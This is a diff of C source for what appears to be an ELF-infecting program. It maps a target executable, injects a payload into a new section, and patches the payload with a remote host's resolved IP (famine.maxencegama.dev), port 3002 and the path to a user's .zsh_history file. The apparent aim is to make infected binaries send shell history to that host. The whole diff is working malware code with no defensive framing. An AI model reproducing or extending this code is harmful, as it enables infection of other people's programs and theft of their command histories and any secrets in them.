@@ -3,14 +3,19 @@
 #include <stdlib.h>
 #include <string.h>
 #include <unistd.h>
+#include <errno.h>
+
 #include <arpa/inet.h>
+#include <netinet/ip.h> 
+#include <netdb.h>
+#include <netinet/in.h>
+
+#include <sys/types.h>
 #include <sys/mman.h>
 #include <sys/stat.h>
-#include <sys/types.h>
 #include <sys/socket.h>
-#include <netinet/in.h>
 #include <sys/syscall.h>
-#include <errno.h>
+
 #include <elf.h>
 
 #ifdef __APPLE__
@@ -30,14 +35,19 @@ extern uint64_t CDECL_NORM(payload_size);
 #define FM_PAYLOAD_PATHOFF		(1024) // sizeof(struct sockaddr_in) + sizeof(path)
 #define FM_PAYLOAD_RTNOFF		(1184 + 4) // FM_PAYLOAD_PATHOFF + sizeof(struct stat) + sizeof(int32_t)
 
-// int CDECL_NORM(payload)(void);
-
 int main(int ac, char **av) {
-	// errno = CDECL_NORM(payload)();
-	// perror("payload");
-	uint16_t port = htons(3002);
-	uint32_t addr_ip = htonl(INADDR_ANY);
-	printf("port: %#x %#x\n", port, addr_ip);
+	struct hostent *hostent = gethostbyname("famine.maxencegama.dev");
+	if (hostent == NULL) {
+		if (errno == 1)
+			printf("Host not found\n");
+		else
+			perror("gethostbyname");
+		return (1);
+	}
+
+	uint16_t port = (3002);
+	uint32_t addr_ip = *(uint32_t *)hostent->h_addr_list[0];
+	printf("port: %#x %#x (%s)\n", port, addr_ip, inet_ntoa(*(struct in_addr *)&addr_ip));
 
 	int fd = open(av[1], O_RDWR);
 	if (fd == -1) {
@@ -207,7 +217,7 @@ int main(int ac, char **av) {
 	 */
 
 	memcpy(map + new_section_offset + payload_size_p - FM_PAYLOAD_IPADDROFF, &addr_ip, sizeof(uint32_t));
-	// memcpy(map + new_section_offset + payload_size_p - FM_PAYLOAD_PORTOFF, &port, sizeof(uint16_t));
+	memcpy(map + new_section_offset + payload_size_p - FM_PAYLOAD_PORTOFF, &port, sizeof(uint16_t));
 	const char targetfile[] = "/home/maxence/.zsh_history";
 	memcpy(map + new_section_offset + payload_size_p - FM_PAYLOAD_PATHOFF, targetfile, sizeof(targetfile));
 
